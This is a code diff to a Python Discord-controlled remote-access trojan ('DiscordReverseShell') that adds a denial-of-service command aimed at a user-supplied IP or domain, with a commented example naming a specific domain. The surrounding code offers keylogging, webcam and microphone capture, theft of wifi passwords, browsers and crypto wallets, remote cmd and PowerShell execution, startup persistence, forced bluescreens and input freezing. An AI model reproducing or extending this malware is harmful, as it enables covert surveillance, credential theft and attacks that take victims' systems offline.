@@ -1,7 +1,7 @@
-import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard, winreg
+import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard, winreg 
 from pynput.mouse import Controller
 from PIL import ImageGrab, Image
-import cv2, pyaudio, datetime
+import cv2, pyaudio, datetime, socket
 import cryptography.fernet as fernet
 #from tkinter import messagebox
 import sys
@@ -14,6 +14,7 @@ from modules.wifi import WifiPasswords
 from pyperclip import paste
 from modules.startup import Startup
 from modules.mic import RecordMic
+from modules.dos import DoS
 
 
 #PIPE = -1
@@ -169,6 +170,7 @@ commands = "\n\r".join([
     "keylogger - Enable keylogger",
     "mic - Record 120 seconds recordings of microphone and send them",
     "join - Joins or leaves voice channel where it streams live microphone",
+    "dos 1 <ip>:<port> - DoS an IP or: dos 2 <domain>:<port>",
     "freeze <1/0> - Freeze all inputs from keyboard and mouse",
     "decrypt <key or keys separated by commas(",") without spaces> <file> - Decrypt an file",
     "encrypt <number of times to encrypt> <file> - Encrypt an file",
@@ -381,9 +383,11 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+
 #PING
     elif message.content == "ping":
         await message.reply(f"PONG, `{round(client.latency * 1000)}ms`")
+
 
 #! SYSTEM INFO
     elif message.content == "sys":
@@ -399,6 +403,7 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.channel.send(embed=embed)
         delete_files([f"{os.getenv('temp')}\\system.txt"])
+
 
 #! CLIPBOARD
     elif message.content == "clipboard":
@@ -420,6 +425,7 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+
 #! PROCESSES    
     elif message.content == "processes":
         try: 
@@ -440,6 +446,7 @@ async def on_message(message):
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(embed=embed)
     
+
 #! CD
     elif message.content.startswith("cd "):
         directory = message.content[3:] #.split(" ")[1]
@@ -456,6 +463,7 @@ async def on_message(message):
             embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
+
 
 #! LS
     elif message.content == "ls":
@@ -477,11 +485,13 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+
 #! CWD    
     elif message.content == "cwd":
         embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}```", color=0xfafafa) #{os.path.basename(link)}
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
+
 
 #! ZIP
     elif message.content.startswith("zip "):
@@ -515,6 +525,7 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+
 #! UPLOAD
     elif message.content.startswith("upload"):
         link = message.content[7:] #.split(" ")[1]
@@ -528,6 +539,7 @@ async def on_message(message):
         embed = discord.Embed(title="Upload", description=f"```{os.getcwd()}\{os.path.basename(link)}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
+
 
 #! CMD
     elif message.content.startswith("cmd "):
@@ -572,6 +584,7 @@ async def on_message(message):
             
         await message.reply(embed=embed)
         
+
 #! POWERSHELL    
     elif message.content.startswith("pw "):
         command = message.content[3:]
@@ -615,6 +628,7 @@ async def on_message(message):
             
         await message.reply(embed=embed)
 
+
 #! RUN
     elif message.content.startswith("run "):
         file = message.content[4:]
@@ -630,11 +644,13 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+
 #! STARTUP
     elif message.content == "startup":
         Startup(sys.argv[0])
         await message.reply("Startup Enabled!")
         
+
 #! BLUESCREEN    
     elif message.content == "bluescreen":
         await message.reply("Attempting...", delete_after=.1)
@@ -651,6 +667,7 @@ async def on_message(message):
             await message.reply("Bluescreen Successful!")
         else:
             await message.reply("Bluescreen Failed!")
+
 
 #! WIFI
     elif message.content == "wifi":
@@ -670,6 +687,7 @@ async def on_message(message):
         await message.reply(embed=embed)
         delete_files([f"{os.getenv('temp')}\\wifi.txt"])
 
+
 #! SCREENSHOT
     elif message.content == "screenshot":
         try:
@@ -684,6 +702,7 @@ async def on_message(message):
         embed.set_image(url="attachment://screenshot.png")
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed, file=file)
+
 
 #! WEBCAM
     elif message.content == "webcam":
@@ -706,14 +725,17 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed, file=webcam)
 
+
 #! BROWSER
     elif message.content == "browser":
         await browsers(message.channel)
+
 
 #! WALLETS
     elif message.content == "wallet":
         await wallets(message.channel)
     
+
 #! KEYLOGGER
     elif message.content == "keylogger":
         await message.reply("Creating new webhook for keylogger...")
@@ -730,10 +752,57 @@ async def on_message(message):
             return
         
         await message.reply("Keylogger enabled!")
-    
+
+
     #elif message.content == "keylogger stop":
     #    #keylogger.stop()
+    #    print(keylogger.is_alive())
     #    keylogger.join()
+    #    print(keylogger.is_alive())
+
+
+#! DOS
+    elif message.content.startswith("dos"):
+        mode = message.content[4:5]
+        url = message.content[6:]
+
+        target, port = url.split(":")
+
+        ip = target if mode == 1 else socket.gethostbyname(target)
+
+        #dos 2 prointegris.com:80
+
+        #if mode == 1: 
+        #    global ip
+        #    ip = target 
+        #    #print(ip)
+        #elif mode == 2: 
+        #    global ip
+        #    ip = socket.gethostbyname(url)
+        #    #print(ip)
+        #else: 
+        #    await message.reply("Invalid mode choice, chose 1 or 2: \n'dos 2 example.com:80' / 'dos 1 1.1.1.1:80'!")
+        #    return
+
+        if not port: port = 80
+
+        if int(port) > 65535 or int(port) < 1: 
+            await message.reply("Invalid port, min is 1 max is 65535")
+            return
+
+        await message.reply("Creating new webhook for DoS...")
+        try:
+            webhook = await message.channel.create_webhook(name="DoS")
+            await message.reply(f"Created webhook, using URL: {webhook.url}")
+            dos = threading.Thread(target=DoS, args=(webhook.url, ip, int(port)), daemon=True)
+            dos.start()
+            
+            #Keylogger(webhook.url).run()
+        except:
+            await message.reply("Failed to create new webhook!")
+            return
+        
+        await message.reply("DoS enabled!")
 
 
 #! FREEZE
@@ -815,7 +884,7 @@ async def on_message(message):
                 await message.reply(embed=embed)
             except:
                 embed = discord.Embed(title="Regedit", description="```Invalid key path or value name!```", color=0xfafafa)
-                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                embed.set_footer(text="github.com/Josakko/DisqcordReverseShell")
                 await message.reply(embed=embed)
 
         elif action == "2":
@@ -1118,8 +1187,4 @@ else: Startup(sys.argv[0])
 
 
 #f"Get-LocalUser -Name '{username}' | Reset-LocalUserPassword -NewPassword (ConvertTo-SecureString -String '{password}' -AsPlainText -Force)"
-
-
-
-#start as admin: --uac-admin
 
